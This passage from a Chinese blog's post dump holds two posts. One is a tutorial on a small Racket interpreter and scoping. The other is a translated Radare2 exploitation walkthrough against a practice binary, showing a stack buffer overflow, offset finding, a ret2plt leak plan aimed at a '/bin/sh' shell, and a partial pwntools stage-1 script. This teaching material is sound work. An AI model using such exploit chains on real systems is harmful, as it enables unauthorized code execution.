种情况（变量，函数，绑定，调用，数字，算术表达式）(define interp (lambda (exp env) (match exp ; 对exp进行模式匹配 [(? symbol? x) ; 变量 (let ([v (lookup x env)]) (cond [(not v) (error &quot;undefined variable&quot; x)] [else v]))] [(? number? x) x] ; 数字 [`(lambda (,x) ,e) ; 函数 (Closure exp env)] [`(let ([,x ,e1]) ,e2) ; 绑定 (let ([v1 (interp e1 env)]) (interp e2 (ext-env x v1 env)))] [`(,e1 ,e2) ; 调用 (let ([v1 (interp e1 env)] [v2 (interp e2 env)]) (match v1 [(Closure `(lambda (,x) ,e) env-save) (interp e (ext-env x v2 env-save))]))] [`(,op ,e1 ,e2) ; 算术表达式 (let ([v1 (interp e1 env)] [v2 (interp e2 env)]) (match op [&apos;+ (+ v1 v2)] [&apos;- (- v1 v2)] [&apos;* (* v1 v2)] [&apos;/ (/ v1 v2)]))])));; 解释器的“用户界面”函数。它把 interp 包装起来，掩盖第二个参数，初始值为 env0(define r2 (lambda (exp) (interp exp env0))) 这里有一些测试例子： 123456789101112131415161718192021222324252627(r2 &apos;(+ 1 2));; =&gt; 3(r2 &apos;(* 2 3));; =&gt; 6(r2 &apos;(* 2 (+ 3 4)));; =&gt; 14(r2 &apos;(* (+ 1 2) (+ 3 4)));; =&gt; 21(r2 &apos;((lambda (x) (* 2 x)) 3));; =&gt; 6(r2&apos;(let ([x 2]) (let ([f (lambda (y) (* x y))]) (f 3))));; =&gt; 6(r2&apos;(let ([x 2]) (let ([f (lambda (y) (* x y))]) (let ([x 4]) (f 3)))));; =&gt; 6 （完整的代码和示例，可以在这里下载。) 在接下来的几节，我们来仔细看看这个解释器的各个部分。 对基本算术操作的解释算术操作一般都是程序里最基本的构造，它们不能再被细分为多个步骤，所以我们先来看看对算术操作的处理。以下就是 R2 解释器处理算术的部分，它是 interp 的最后一个分支。 12345678910(match exp ... ... [`(,op ,e1 ,e2) (let ([v1 (interp e1 env)] ; 递归调用 interp 自己，得到 e1 的值 [v2 (interp e2 env)]) ; 递归调用 interp 自己，得到 e2 的值 (match op ; 分支：处理操作符 op 的 4 种情况 [&apos;+ (+ v1 v2)] ; 如果是加号，输出结果为 (+ v1 v2) [&apos;- (- v1 v2)] ; 如果是减号，乘号，除号，相似的处理 [&apos;* (* v1 v2)] [&apos;/ (/ v1 v2)]))]) 你可以看到它几乎跟刚才写的计算器一模一样，不过现在 interp 的调用多了一个参数 env 而已。这个 env 是所谓“环境”，我们下面很快就讲。 对数字的解释对数字的解释很简单，把它们原封不动返回就可以了。 [(? number? x) x] 变量和函数变量和函数是解释器里最麻烦的部分，所以我们来仔细看看。 变量（variable）的产生，是数学史上的最大突破之一。因为变量可以被绑定到不同的值，从而使函数的实现成为可能。比如数学函数 f(x) = x 2，其中 x 是一个变量，它把输入的值传递到函数体 x 2 里面。如果没有变量，函数就不可能实现。 对变量最基本的操作，是对它的“绑定”（binding）和“取值”（evaluate）。什么是绑定呢？拿上面的函数 f(x) 作为例子。当我们调用 f(1) 时，函数体里面的 x 等于 1，所以 x 2 的值是 2，而当我们调用 f(2) 时，函数体里面的 x 等于 2，所以 x 2 的值是 4。这里，两次对 f 的调用，分别对 x 进行了两次绑定。第一次 x 被绑定到了 1，第二次被绑定到了 2。 你可以把“绑定”理解成这样一个动作，就像当你把插头插进电源插座的那一瞬间。插头的插脚就是 f(x) 里面的那个 x，而 x * 2 里面的 x，则是电线的另外一端。所以当你把插头插进插座，电流就通过这根电线到达另外一端。如果电线导电性能良好，两头的电压应该相等。 环境我们的解释器只能一步一步的做事情。比如，当它需要求 f(1) 的值的时候，它分成两步操作： 把 x 绑定到 1，这样函数体内才能看见这个绑定。 进入 f 的函数体，对 x * 2 进行求值。 这就像一个人做出这两个动作： 把插头插进插座 。 到电线的另外一头，测量它的电压，并且把结果乘以 2。 在第一步和第二步之间，我们如何记住 x 的值呢？通过所谓“环境”！我们用环境记录变量的值，并且把它们传递到变量的“可见区域”。变量的可见区域，用术语说叫做“作用域”（scope）。 在我们的解释器里，用于处理环境的代码如下： 123456789101112131415;; 空环境(define env0 &apos;());; 对环境 env 进行扩展，把 x 映射到 v(define ext-env (lambda (x v env) (cons `(,x . ,v) env)));; 取值。在环境中 env 中查找 x 的值(define lookup (lambda (x env) (let ([p (assq x env)]) (cond [(not p) #f] [else (cdr p)])))) 这里我们用一种最简单的数据结构，Scheme 的 association list，来表示环境。Association list 看起来像这个样子：((x . 1) (y . 2) (z . 5))。它是一个两元组（pair）的链表，左边的元素是 key，右边的元素是 value。写得直观一点就是： 123((x . 1) (y . 2) (z . 5)) 查表操作就是从头到尾搜索，如果左边的 key 是要找的变量，就返回整个 pair。简单吧？效率很低，但是足够完成我们现在的任务。 ext-env 函数扩展一个环境。比如，如果原来的环境 env1 是 ((y . 2) (x . 1)) 那么 (ext-env x 3 env1)，就会返回 ((x . 3) (y . 2) (x . 1))。也就是把 (x . 3) 加到 env1 的最前面去。 那我们什么时候需要扩展环境呢？当我们进行绑定的时候。绑定可能出现在函数调用时，也可能出现在 let 绑定时。我们选择的数据结构，使得环境自然而然的具有了作用域（scope）的特性。 环境其实是一个堆栈（stack）。内层的绑定，会出现在环境的最上面，这就是在“压栈”。这样我们查找变量的时候，会优先找到最内层定义的变量。 举个例子： 12345(let ([x 1]) ; env=&apos;()。绑定x到1。 (let ([y 2]) ; env=&apos;((x . 1))。绑定y到2。 (let ([x 3]) ; env=&apos;((y . 2) (x . 1))。绑定x到3。 (+ x y)))) ; env=&apos;((x . 3) (y . 2) (x . 1))。查找x，得到3；查找y，得到2。;; =&gt; 5 这段代码会返回5。这是因为最内层的绑定，把 (x . 3) 放到了环境的最前面，这样查找 x 的时候，我们首先看到 (x . 3)，然后就返回值3。之前放进去的 (x . 1) 仍然存在，但是我们先看到了最上面的那个(x . 3)，所以它被忽略了。 这并不等于说 (x . 1) 就可以被改写或者丢弃，因为它仍然是有用的。你只需要看一个稍微不同的例子，就知道这是怎么回事： 12345(let ([x 1]) ; env=&apos;()。绑定x到1。 (+ (let ([x 2]) ; env=&apos;((x . 1))。绑定x到2。 x) ; env=&apos;((x . 2) (x . 1))。查找x，得到2。 x)) ; env=&apos;((x . 1))。查找x，得到1。;; =&gt; 3 ; 两个不同的x的和，1+2等于3。 这个例子会返回3。它是第3行和第4行里面两个 x 的和。由于第3行的 x 处于内层 let 里面，那里的环境是 ((x . 2) (x . 1))，所以查找 x 的值得到2。第4行的 x 在内层 let 外面，但是在外层 let 里面，那里的环境是 ((x . 1))，所以查找 x 的值得到1。这很符合直觉，因为 x 总是找到最内层的定义。 值得注意的是，环境被扩展以后，形成了一个新的环境，而原来的环境并没有被改变。比如，上面的 ((y . 2) (x . 1)) 并没有删除或者修改，只不过是被“引用”到一个更大的列表里去了。 这样不对已有数据进行修改（mutation）的数据结构，叫做“函数式数据结构”。函数式数据结构只生成新的数据，而不改变或者删除老的。它可能引用老的结构，然而却不改变老的结构。这种“不修改”（immutable）的性质，在我们的解释器里是很重要的，因为当我们扩展一个环境，进入递归，返回之后，外层的代码必须仍然可以访问原来外层的环境。 当然，我们也可以用另外的，更高效的数据结构（比如平衡树，串接起来的哈希表）来表示环境。如果你学究一点，甚至可以用函数来表示环境。这里为了代码简单，我们选择了最笨，然而正确，容易理解的数据结构。 对变量的解释了解了变量，函数和环境，我们来看看解释器对变量的“取值”操作，也就是 match 的第一种情况。 [(? symbol? x) (lookup x env)] 这就是在环境中，沿着从内向外的“作用域顺序”，查找变量的值。 这里的 (? symbol? x) 是一种特殊的模式，它使用 Scheme 函数 symbol? 来判断输入是否是一个符号，如果是，就把它绑定到 x，然后你就可以在右边用 x 来指称这个输入。 对绑定的解释现在我们来看看对 let 绑定的解释： 123[`(let ([,x ,e1]) ,e2) (let ([v1 (interp e1 env)]) ; 解释右边表达式e1，得到值v1 (interp e2 (ext-env x v1 env)))] ; 把(x . v1)扩充到环境顶部，对e2求值 通过代码里的注释，你也许已经可以理解它在做什么。我们先对表达式 e1 求值，得到 v1。然后我们把 (x . v1) 扩充到环境里，这样 (let ([x e1]) …) 内部都可以看到 x 的值。然后我们使用这个扩充后的环境，递归调用解释器本身，对 let 的主体 e2 求值。它的返回值就是这个 let 绑定的值。 Lexical Scoping 和 Dynamic Scoping下面我们准备谈谈函数定义和调用。对函数的解释是一个微妙的问题，很容易弄错，这是由于函数体内也许会含有外层的变量，叫做“自由变量”。所以在分析函数的代码之前，我们来了解一下不同的“作用域”（scoping）规则。 我们举个例子来解释这个问题。下面这段代码，它的值应该是多少呢？ 1234(let ([x 2]) (let ([f (lambda (y) (* x y))]) (let ([x 4]) (f 3)))) 在这里，f 函数体 (lambda (y) (* x y)) 里的那个 x，就是一个“自由变量”。x 并不是这个函数的参数，也不是在这个函数里面定义的，所以我们必须到函数外面去找 x 的值。 我们的代码里面，有两个地方对 x 进行了绑定，一个等于2，一个等于4，那么 x 到底应该是指向哪一个绑定呢？这似乎无关痛痒，然而当我们调用 (f 3) 的时候，严重的问题来了。f 的函数体是 (* x y)，我们知道 y 的值来自参数 3，可是 x 的值是多少呢？它应该是2，还是4呢？ 在历史上，这段代码可能有两种不同的结果，这种区别一直延续到今天。如果你在 Scheme （Racket）里面写以上的代码，它的结果是6。 1234567;; Scheme(let ([x 2]) (let ([f (lambda (y) (* x y))]) (let ([x 4]) (f 3))));; =&gt; 6 现在我们来看看，在 Emacs Lisp 里面输入等价的代码，得到什么结果。如果你不熟悉 Emacs Lisp 的用法，那你可以跟我做：把代码输入 Emacs 的那个叫 scratch 的 buffer。把光标放在代码最后，然后按 C-x C-e，这样 Emacs 会执行这段代码，然后在 minibuffer 里显示结果： 结果是12！如果你把代码最内层的 x 绑定修成其它的值，输出会随之改变。 奇怪吧？Scheme 和 Emacs Lisp，到底有什么不一样呢？实际上，这两种看似差不多的 “Lisp 方言”，采用了两种完全不同的作用域方式。Scheme 的方式叫做 lexical scoping （或者 static scoping），而 Emacs 的方式叫做 dynamic scoping。 那么哪一种方式更好呢？或者用哪一种都无所谓？答案是，dynamic scoping 是非常错误的做法。历史的教训告诉我们，它会带来许许多多莫名其妙的 bug，导致 dynamic scoping 的语言几乎完全没法用。这是为什么呢？ 原因在于，像 (let ((x 4)) …) 这样的变量绑定，只应该影响它内部“看得见”的 x 的值。当我们看见 (let ((x 4)) (f 3)) 的时候，并没有在 let 的内部看见任何叫“x” 的变量，所以我们“直觉”的认为，(let ((x 4)) …) 对 x 的绑定，不应该引起 (f 3) 的结果变化。 然而对于 dynamic scoping，我们的直觉却是错误的。因为 f 的函数体里面有一个 x，虽然我们没有在 (f 3) 这个调用里面看见它，然而它却存在于 f 定义的地方。要知道，f 定义的地方也许隔着几百行代码，甚至在另外一个文件里面。而且调用函数的人凭什么应该知道， f 的定义里面有一个自由变量，它的名字叫做 x？所以 dynamic scoping 在设计学的角度来看，是一个反人类的设计 :) 相反，lexical scoping 却是符合人们直觉的。虽然在 (let ((x 4)) (f 3)) 里面，我们把 x 绑定到了 4，然而 f 的函数体并不是在那里定义的，我们也没在那里看见任何 x，所以 f 的函数体里面的 x，仍然指向我们定义它的时候看得见的那个 x，也就是最上面的那个 (let ([x 2]) …)，它的值是 2。所以 (f 3) 的值应该等于 6，而不是12。 对函数的解释为了实现 lexical scoping，我们必须把函数做成“闭包”（closure）。闭包是一种特殊的数据结构，它由两个元素组成：函数的定义和当前的环境。我们把闭包定义为一个 Racket 的 struct 结构： 1(struct Closure (f env)) 有了这个数据结构，我们对 (lambda (x) e) 的解释就可以写成这样： 12[`(lambda (,x) ,e) (Closure exp env)] 注意这里的 exp 就是 (lambda (,x) ,e)` 自己。 有意思的是，我们的解释器遇到 (lambda (x) e)，几乎没有做任何计算。它只是把这个函数包装了一下，把它与当前的环境一起，打包放到一个数据结构（Closure）里面。这个闭包结构，记录了我们在函数定义的位置“看得见”的那个环境。稍候在调用的时候，我们就能从这个闭包的环境里面，得到函数体内的自由变量的值。 对调用的解释好了，我们终于到了最后的关头，函数调用。为了直观，我们把函数调用的代码拷贝如下： 123456[`(,e1 ,e2) (let ([v1 (interp e1 env)] ; 计算函数 e1 的值 [v2 (interp e2 env)]) ; 计算参数 e2 的值 (match v1 [(Closure `(lambda (,x) ,e) env-save) ; 用模式匹配的方式取出闭包里的各个子结构 (interp e (ext-env x v2 env-save))]))] ; 在闭包的环境env-save中把x绑定到v2，解释函数体 函数调用都是 (e1 e2) 这样的形式，e1 表示函数，e2 是它的参数。我们需要先分别求出函数 e1 和参数 e2 的值。 函数调用就像把一个电器的插头插进插座，使它开始运转。比如，当 (lambda (x) ( x 2)) 被作用于 1 时，我们把 x 绑定到 1，然后解释它的函数体 ( x 2)。但是这里有一个问题，函数体内的自由变量应该取什么值呢？从上面闭包的讨论，你已经知道了，自由变量的值，应该从闭包的环境查询。 操作数 e1 的值 v1 是一个闭包，它里面包含一个函数定义时保存的环境 env-save。我们把这个环境 env-save 取出来，那我们就可以查询它，得到函数体内自由变量的值。然而函数体内不仅有自由变量，还有对函数参数的使用，所以我们必须扩展这个 env-save 环境，把参数的值加进去。这就是为什么我们使用 (ext-env x v2 env-save)，而不只是 env-save。 你可能会奇怪，那么解释器的环境 env 难道这里就不用了吗？是的。我们通过 env 来计算 e1 和 e2 的值，是因为 e1 和 e2 里面的变量，在“当前环境”（env）里面看得见。可是函数体的定义，在当前环境下是看不见的。它的代码在别的地方，而那个地方看得见的环境，被我们存在闭包里了，它就是 env-save。所以我们把 v1 里面的闭包环境 env-save 取出来，用于计算函数体的值。 有意思的是，如果我们用 env，而不是env-save 来解释函数体，那我们的语言就变成了 dynamic scoping。现在来实验一下：你可以把 (interp e (ext-env x v2 env-save)) 里面的 env-save 改成 env，再试试我们之前讨论过的代码，它的输出就会变成 12。那就是我们之前讲过的，dynamic scoping 的结果。 1234567(r2&apos;(let ([x 2]) (let ([f (lambda (y) (* x y))]) (let ([x 4]) (f 3)))));; =&gt; 12 你也许发现了，如果我们的语言是 dynamic scoping，那就没必要使用闭包了，因为我们根本不需要闭包里面保存的环境。这样一来，dynamic scoping 的解释器就可以写成这样： 123456789101112131415(define interp (lambda (exp env) (match exp ... ... [`(lambda (,x) ,e) ; 函数：直接返回自己的表达式 exp] ... ... [`(,e1 ,e2) (let ([v1 (interp e1 env)] [v2 (interp e2 env)]) (match v1 [`(lambda (,x) ,e) ; 调用：直接使用函数的表达式本身 (interp e (ext-env x v2 env))]))] ... ...))) 注意到这个解释器的函数有多容易实现吗？它就是这个函数的表达式自己，原封不动。用函数的表达式本身来表示它的值，是很直接很简单的做法，也是大部分人一开头就会想到的。然而这样实现出来的语言，就不知不觉地采用了 dynamic scoping。 这就是为什么很多早期的 Lisp 语言，比如 Emacs Lisp，都使用 dynamic scoping。这并不是因为它们的设计者在 dynamic scoping 和 lexical scoping 两者之中做出了选择，而是因为使用函数的表达式本身来作为它的值，是最直接，一般人都会首先想到的做法。 另外，在这里我们也看到环境用“函数式数据结构”表示的好处。闭包被调用时它的环境被扩展，但是这并不会影响原来的那个环境，我们得到的是一个新的环境。所以当函数调用返回之后，函数的参数绑定就自动“注销”了。 如果你用一个非函数式的数据结构，在绑定参数时不生成新的环境，而是对已有环境进行赋值，那么这个赋值操作就会永久性的改变原来环境的内容。所以你在函数返回之后必须删除参数的绑定。这样不但麻烦，而且在复杂的情况下很容易出错。 思考题：可能有些人看过 lambda calculus，这些人可能知道 (let ([x e1]) e2) 其实等价于一个函数调用：((lambda (x) e2) e1)。现在问题来了，我们在讨论函数和调用的时候，很深入的讨论了关于 lexical scoping 和 dynamic scoping 的差别。既然 let 绑定等价于一个函数定义和调用，为什么之前我们讨论对绑定的时候，没有讨论过 lexical scoping 和 dynamic scoping 的问题，也没有制造过闭包呢？ 不足之处现在你已经学会了如何写出一个简单的解释器，它可以处理一个相当强大的函数式语言。出于教学的考虑，这个解释器并没有考虑实用的需求，所以它并不能作为工业应用。在这里，我指出它的一些不足之处。 缺少必要的语言构造。我们的语言里缺少好些实用语言必须的构造：递归，数组，赋值操作，字符串，自定义数据结构，…… 作为一篇基础性的读物，我不能把这些都加进来。如果你对这些有兴趣，可以看看其它书籍，或者等待我的后续作品。 不合法代码的检测和报告。你也许发现了，这个解释器的 match 表达式，全都假定了输入都是合法的程序，它并没有检查不合法的情况。如果你给它一个不合法的程序，它不会马上报错，而是会真去算它，以至于导致奇怪的后果。一个实用的解释器，必须加入对代码格式进行全面检测，在运行之前就报告不合法的代码结构。 低效率的数据结构。在 association list 里面查找变量，是线性的复杂度。当程序有很多变量的时候就有性能问题。一个实用的解释器，需要更高效的数据结构。这种数据结构不一定非得是函数式的。你也可以用非函数式的数据结构（比如哈希表），经过一定的改造，达到同样的性质，却具有更高的效率。 ​ 另外，你还可以把环境转化成一个数组。给环境里的每个变量分配一个下标（index），在这个数组里就可以找到它的值。如果你用数组表示环境，那么这个解释器就向编译器迈进了一步。 S 表达式的歧义问题。为了教学需要，我们的解释器直接使用 S 表达式来表达语法树，用模式匹配来进行分支遍历。在实际的语言里，这种方式会带来比较大的问题。因为 S 表达式是一种通用的数据结构，用它表示的东西，看起来都差不多的样子。一旦程序的语法构造多起来，直接对 S 表达式进行模式匹配，会造成歧义。 ​ 比如 (,op ,e1 ,e2) ，你以为它只匹配二元算术操作，比如 (+ 1 2)。但它其实也可以匹配一个 let 绑定： (let ([x 1]) (* x 2))。这是因为它们顶层元素的数目是一样的。为了消除歧义，你得小心的安排模式的顺序，比如你必须把 (let ([,x ,e1]) ,e2) 的模式放在 (,op ,e1, e2) 前面。所以最好的办法，是不要直接在 S 表达式上写解释器，而是先写一个“parser”，这个 parser 把 S 表达式转换成 Racket 的 struct 结构。然后解释器再在 struct 上面进行分支匹配。这样解释器不用担心歧义问题，而且会带来效率的提升。","categories":[],"tags":[{"name":"repost","slug":"repost","permalink":"https://qianfei11.github.io/tags/repost/"}]},{"title":"【译】Radare2之旅-Part2：Exploitation","slug":"【译】Radare2之旅-Part2：Exploitation","date":"2019-02-23T03:18:10.000Z","updated":"2019-02-28T05:32:09.034Z","comments":true,"path":"2019/02/23/【译】Radare2之旅-Part2：Exploitation/","link":"","permalink":"https://qianfei11.github.io/2019/02/23/【译】Radare2之旅-Part2：Exploitation/","excerpt":"翻译自Megabeets。","text":"翻译自Megabeets。 序言欢迎来到我们radare2之旅的第二部分！在这一部分，我们会涵盖radare2的更多部分，同时这次更注重于二进制漏洞挖掘。 相信大家都一定很期待这第二部分，之后的内容也一定会更快地分享给大家。如果你还没有阅读过这一系列的第一部分，我非常推荐你去读一读。第一部分记录了radare2的基础内容，同时也解释了很多我今天会用到的命令。 在这一部分，我们的目的是对一个简单的程序进行漏洞挖掘与利用。radare2有很多不同的功能可以帮我们对漏洞进行利用，例如保护技术、查找ROP、生成随机序列、查看寄存器内容等等。你可以在本文末尾找到一份命令对应表。今天我会向你们展示这些强大的功能，同时我们用radare2来绕过在开启ASLR的系统上运行并且有NX保护的程序。我假设大家都已经掌握了以下的预备知识： 汇编语言 程序保护技术（NX、ASLR） 栈帧结构 缓冲区溢出 面向返回编程 x86调用约定 熟悉这些知识是很重要的一步，因为文章中我并不会细讲，甚至不会对其解释。 更新radare2首先，我们将radare2更新至其git的最新版版： 123$ git clone https://github.com/radare/radare2.git # 如果你还没有克隆下来的话$ cd radare2$ ./sys/install.sh 等待更新完成需要很长一段时间，在这期间不如看些视频放松一会儿。 熟悉程序你可以在这里下载程序，在这里下载源码。如果你想自己编译程序，用以下命令： 1$ gcc -m32 -fno-stack-protector megabeets_0x2.c -o megabeets_0x2 这次的程序与上一次的程序非常相似，只是在main()函数中有一些细微的改变： 编译时不使用参数-z execstac来开启NX 通过scanf来接收用户的输入，而不是通过程序的参数 大部分输出的函数为puts 对程序的输出做了一点修改 这是之前的main()函数： 12345678910111213int main(int argc, char *argv[])&#123; printf(\"\\n .:: Megabeets ::.\\n\"); printf(\"Think you can make it?\\n\"); if (argc &gt;= 2 &amp;&amp; beet(argv[1])) &#123; printf(\"Success!\\n\\n\"); &#125; else printf(\"Nop, Wrong argument.\\n\\n\"); return 0;&#125; 然后现在的main函数是这样的： 12345678910111213141516int main(int argc, char *argv[])&#123; char *input; puts(\"\\n .:: Megabeets ::.\\n\"); puts(\"Show me what you got:\"); scanf(\"%ms\", &amp;input); if (beet(input)) &#123; printf(\"Success!\\n\\n\"); &#125; else puts(\"Nop, Wrong argument.\\n\\n\"); return 0;&#125; 程序的功能十分简单，并且在前一篇文章中我们已经对它很熟悉了——要求输入字符串，与经过rot13加密的字符串Megabeets比较。故输入应该为Zrtnorrgf。 123456789101112131415$ ./megabeets_0x2 .:: Megabeets ::.Show me what you got:blablablablaNop, Wrong argument.$ ./megabeets_0x2 .:: Megabeets ::.Show me what you got:ZrtnorrgfSuccess! 这些都很简单，但是我们今天的重点并不是破解一个简单的crackme，而是对其进行漏洞利用。那我们开始吧！ 理解漏洞对于每一个PWN题给出的程序来说，检查程序开了什么保护是一个好习惯。我们可以使用上一篇文章中提到的rabin2，或者直接在radare2的shell里执行i命令。因为我们还没有用radare2打开文件，就先用rabin2来看看： 1234567891011121314151617181920212223242526272829$ rabin2 -I megabeets_0x2 arch x86binsz 6072bintype elfbits 32canary falseclass ELF32crypto falseendian littlehavecode trueintrp /lib/ld-linux.so.2lang clinenum truelsyms truemachine Intel 80386maxopsz 16minopsz 1nx trueos linuxpcalign 0pic falserelocs truerelro partialrpath NONEstatic falsestripped falsesubsys linuxva true 在标记的几行中，我们可以看到程序开了NX，也就是说栈是不可执行的。还有，该程序没有开启Canary、PIC或是RELRO。 现在我们迅速地过一遍程序的执行流，这次我们看一看它的反汇编代码（并不是每次漏洞挖掘都能有源码）。使用radare2的调试模式打开程序： 12345678$ r2 -d megabeets_0x2Process with PID 20859 started…= attach 20859 20859bin.baddr 0x08048000Using 0x8048000Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2asm.bits 32– Your endian swaps[0xf7782b30]&gt; aas -d – 用调试模式打开 aas – 分析函数、符号以及其他 注意：正如我在前一篇文章所提到的，开始时使用aaa分析是最推荐的方式，因为分析本来就是一个很复杂的过程。我在这篇回答里写了更多——读一下也许会让你的理解更深。 现在我们继续执行程序，直到main函数。只要输入命令dcu main： 12345678[0xf7797b30]&gt; dcu?|Usage: dcu Continue until address| dcu address Continue until address| dcu [..tail] Continue until the range| dcu [from] [to] Continue until the range[0xf7797b30]&gt; dcu mainContinue until 0x08048658 using 1 bpsizehit breakpoint at: 8048658 dcu代表debug continue until 现在让我们输入VV进入图形模式。在第一部分解释过，你可以通过p和P切换视角，通过k/j/h/l分别向上/下/左/右移动，通过g和调用旁的字母跳转函数（例如gd）。 用?来列出所有在图形模式下的命令，同时别忘记R命令😉 main()函数是程序要求我们输入的地方，并且它将输入传给sym.beet。通过gc我们跳转到处理我们输入的beet()函数： 我们可以看到用户的输入[arg_8h]被复制给一个缓冲区（[local_88h]），然后就是我们在前一篇文章中所看到过的，字符串Megabeets用rot13加密了，所得结果与我们的输入做比较。我们之前了解过，我这里就不做深究。 你有看到什么可以的地方吗？我们的输入没有对长度做检查，然后直接复制到了缓冲区中。这意味着如果我们输入一串超过缓冲区大小的字符串，就能导致栈上的缓冲区溢出。至此，我们找到了漏洞。 规划漏洞利用脚本既然我们已经找到了有漏洞的函数，我们需要构造一个payload来利用它。我们的目标很明了，就是在系统上成功开一个shell。首先，我们要确认确实有一个有漏洞的函数，然后我们需要找到一个我们的payload可以覆盖栈的偏移。 我们将会使用一个radare2框架中的工具，叫做ragg2。它能够为我们生成一段循环的德布鲁因序列，用来检测覆盖缓冲区的确切的偏移大小。 123456789$ ragg2 -&lt;truncated&gt; -P [size] prepend debruijn pattern&lt;truncated&gt; -r show raw bytes instead of hexpairs&lt;truncated&gt; $ ragg2 -P 100 -rAAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAh 我们知道我们的程序通过输入流读取我们的输入，而不是从shell中读取我们的输入。故我们将会使用又一个来自radare2工具箱中的工具，rarun2。 rarun2可以在不同环境、参数、执行权限、文件夹下运行程序，并且覆盖默认的文件描述符（例如stdin） 如果你需要在跑一个程序时使用很长的参数，它会起很大的作用。而且漏洞利用通常都会向输入流传一大堆数据。 我们需要做以下的三个步骤： 使用ragg2将德布鲁因序列写入一个文件 新建一个rarun2配置文件，并且把前一个文件作为stdin 让radare2来找到偏移 12345678910111213141516171819202122232425262728$ ragg2 -P 200 -r &gt; pattern.txt$ cat pattern.txtAAABAACAADAAEAAFAAGAAHAAI… &lt;truncated&gt; …7AA8AA9AA0ABBABCABDABEABFA $ vim profile.rr2 $ cat profile.rr2#!/usr/bin/rarun2stdin=./pattern.txt $ r2 -r profile.rr2 -d megabeets_0x2Process with PID 21663 started…= attach 21663 21663bin.baddr 0x08048000Using 0x8048000Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2asm.bits 32 — Use rarun2 to launch your programs with a predefined environment.[0xf77c2b30]&gt; dcSelecting and continuing: 21663 .:: Megabeets ::. Show me what you got?child stopped with signal 11 [0x41417641]&gt; 我们运行程序，并将pattern.txt的内容用rarun2传给stdin，SIGSEV 11。 一个信号是一种发送给进程或是一个具体线程的异步通知，这样与之相同的进程就会在某个事件发生时得到提醒。 SIGSEGV（11）信号在访问了某个无效的虚拟内存或段错误后会触发。 你发现了吗？我们实时的指针现在指向了0x41417641。这是一个无效的地址，它表示了字符串AvAA（小端序及ascii码转换），也就是我们送的字符串的一部分。radare2允许我们找到给出的值在德布鲁因序列中的偏移。 123456[0x41417641]&gt; wop?|Usage: wop[DO] len @ addr | value| wopD len [@ addr] Write a De Bruijn Pattern of length ‘len’ at address ‘addr’| wopO value Finds the given value into a De Bruijn Pattern at current offset[0x41417641]&gt; wopO `dr eip`140 既然我们已经知道需要覆盖返回地址的偏移为140，我们可以开始编写脚本了。 编写漏洞利用脚本我之前也提到过很多次，这篇文章不是教一些漏洞利用的基础知识的，它的目的是展示radare2在漏洞利用中是如何使用的。因此，我不会过多地解释脚本的每个部分。 我们的目标是在系统中产生一个shell。这有很多种方法，尤其是这样一个程序。为了知道我们能做什么，首先我们需要知道我们不能做什么。我们的程序在开了ASLR地环境下，所以我们不能猜测到libc在内存中的地址。那就可以和ret2libc说再见了。另外，程序开了NX，这意味栈是不可执行的，所以我们不能直接在栈上放一个shellcode然后跳过去。 虽然这些保护让我们不能使用一些漏洞利用技术，然而这不能阻止我们轻松地绕过它们。编写我们的脚本时，需要细心地观察提供给我们的运行库以及函数。 让我们再次通过调试模式打开程序，然后看一看它使用的运行库和函数。先看库： 123456789101112$ r2 -d megabeets_0x2Process with PID 23072 started…= attach 23072 23072bin.baddr 0x08048000Using 0x8048000Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2asm.bits 32— You haxor! Me jane?[0xf7763b30]&gt; il[Linked libraries]libc.so.61 library il表示Information libraries，即告诉我们程序所使用的运行库。对于该程序来说，只有我们最爱的libc。 现在通过执行ii命令——Information Imports，让我们看看导入的函数。我们可以加上q来减少冗长的输出： 12345678910111213141516[0xf7763b30]&gt; ii[Imports]ordinal=001 plt=0x08048370 bind=GLOBAL type=FUNC name=strcmpordinal=002 plt=0x08048380 bind=GLOBAL type=FUNC name=strcpyordinal=003 plt=0x08048390 bind=GLOBAL type=FUNC name=putsordinal=004 plt=0x00000000 bind=WEAK type=NOTYPE name=__gmon_start__ordinal=005 plt=0x080483a0 bind=GLOBAL type=FUNC name=__libc_start_mainordinal=006 plt=0x080483b0 bind=GLOBAL type=FUNC name=__isoc99_scanf6 imports[0xf7763b30]&gt; iiqstrcmpstrcpyputs__gmon_start____libc_start_main__isoc99_scanf 计划 泄漏puts的真实地址 计算libc的基址 计算system的地址 在libc中找到包含字符串/bin/sh的地址 调用system(&quot;/bin/sh&quot;)打开一个shell 泄漏puts的地址我们需要用到ret2plt来泄漏puts的真实地址。PLT（Procedure Linkage Table）是内存中的结构体，它包括一小段代码，能够跳转到在动态链接时程序之外的函数地址。不管什么时候，我们在.text段看到CALL指令，并不是直接跳到函数。实际上，它跳转到了PLT中的一小段代码，像是func_name@plt这样。这一小段代码跳转到GOT（Global Offset Table）中的列出的该函数的地址。GOT表入口点会指回PLT，同时PLT会调用一个动态链接器来确定该函数的真实地址。下一次调用func_name@plt时，这段代码会直接跳转到GOT表里的函数地址。想要了解更多关于动态链接的知识，我推荐伊恩兰斯泰勒写的这一系列关于链接器的文章 为了达到这个目的，我们需要找到puts在PLT以及GOT中的地址，然后调用puts@plt并且把puts@got作为参数。我们将把这些调用连在一起，在scanf时传给程序。然后我们会返回到我们利用的第二个阶段。puts将会把它真实的地址输出出来。 12345678+---------------------+| Stage 1 |+---------------------+| padding (140 bytes) || puts@plt || entry_point || puts@got |+---------------------+ 编写脚本我们需要使用pwnlib框架，而且它是我最喜欢的python漏洞利用框架。他简化了很多东西，让利用更简便。当然你也可以使用其他你喜欢的方式。 使用pip下载pwntools： 12$ pip install --upgrade pip$ pip install --upgrade pwntools 你可以在官方文档上了解更多关于pwntools。 这是我们第一阶段的python脚本： 123456789101112131415161718192021222324252627282930313233343536from pwn import * # Addressesputs_plt =puts_got =entry_point = # context.log_level = \"debug\" def main(): # open process p = process(\"./megabeets_0x2\") # Stage 1 # Initial payload payload = \"A\"*140 # padding ropchain = p32(puts_plt) ropchain += p32(entry_point) ropchain += p32(puts_got) payload = payload + ropchain p.clean() p.sendline(payload) # Take 4 bytes of the output leak = p.recv(4) leak = u32(leak) log.info(\"puts is at: 0x%x\" % leak) p.clean() if __name__ == \"__main__\": main() 